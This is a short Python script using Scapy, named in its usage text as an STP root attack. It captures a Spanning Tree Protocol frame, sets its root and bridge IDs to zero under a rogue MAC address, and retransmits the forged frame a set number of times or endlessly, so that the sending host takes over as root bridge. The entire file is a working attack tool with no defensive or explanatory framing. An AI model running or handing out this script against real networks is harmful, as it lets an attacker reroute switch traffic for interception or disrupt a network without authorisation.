from scapy.all import *
import time
from argparse import ArgumentParser


def main():
    
    # Defining the arguments
    parser = ArgumentParser()
    parser.add_argument('--rogue-mac', '-r', help='Rogue MAC Address')
    parser.add_argument('--count', '-c', help='Count of frames to send')
    parser.epilog = "Usage: python stp_root_attack.py -r 00:00:00:00:00:01 -c 50"
    
    args = parser.parse_args()
    
    #print(args)
    
    if args.rogue_mac is not None:
        
        # Capture the STP frame
        packet = sniff(filter="ether dst 01:80:c2:00:00:00", count=1)   # STP uses this well known MAC Address 
        print("*************** Original Packet ***************")
        packet[0].show()
        
        # Modify the STP frame to be malicious
        packet[0].src = args.rogue_mac
        packet[0].rootid = 0                    # Specify a low Root ID (highest priority)
        packet[0].rootmac = args.rogue_mac
        packet[0].bridgeid = 0                  # Specify a low Root ID (highest priority)
        packet[0].bridgemac = args.rogue_mac
        print("--------------- Modified Packet ---------------")
        packet[0].show()
        
        # Loop to continuously send the frame, ensuring the root switch isn't taken over:                
        # Defining the amount of times to send the malicious STP frame
        print("Transmitting malicious STP frames now")
        
        count = 0
        
        if args.count is not None:
            count = int(args.count)
            for i in range(0, count):
                sendp(packet[0], loop=0, verbose=1)
                time.sleep(1)
        else:
            sendp(packet[0], loop=1, verbose=1)
    
        sys.exit(0)
        
    else:
        parser.print_help()
        sys.exit(1)
        
main()
